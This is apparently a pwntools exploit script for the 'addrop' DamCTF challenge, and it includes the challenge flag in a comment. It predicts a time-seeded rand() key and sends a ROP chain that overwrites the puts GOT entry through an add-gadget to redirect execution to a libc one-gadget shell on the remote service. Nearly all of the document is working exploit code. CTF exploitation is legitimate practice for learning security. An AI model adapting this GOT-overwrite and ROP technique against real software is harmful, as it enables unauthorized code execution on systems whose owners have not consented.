#exploit for addrop
#dam{We@K-rNg->we4K-3NCRyP7IOn}
from pwn import *
import time
from ctypes import *
elf = ELF("./addrop")
libc=elf.libc
lib=CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.binary=elf
#target=process([elf.path])
target=remote('chals.damctf.xyz',31227)
context.log_level='DEBUG'

lib.srand(lib.time(0))
key=lib.rand()
key=(key^(lib.rand()<<0x15))%(2**64)
key=key^(lib.rand()<<0x2a)%(2**64)

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

key1=key%(2**32)
key2=key>>32
gadget=0x00000000004007e8 #add dword ptr [rbp - 0x3d], ebx; ret
poprbp=0x0000000000400788
poprbx=0x000000000040093e
puts_got=0x600dc0
payload="\x00"*0x40+p64((-key2)%(2**64))
payload+=p64(poprbp)
payload+=p64(puts_got+0x3d+4)
payload+=p64(gadget)
payload+=p64(poprbx)
offset=(-key1-libc.sym["puts"]+0xe58b8)%(2**64)
payload+=p64(offset)
payload+=p64(poprbp)
payload+=p64(puts_got+0x3d)
payload+=p64(gadget)
payload+=p64(poprbp)
payload+=p64(0x600e80+0x88)
payload+=p64(elf.plt["puts"])
sla("memfrob?\n",payload)
target.interactive()
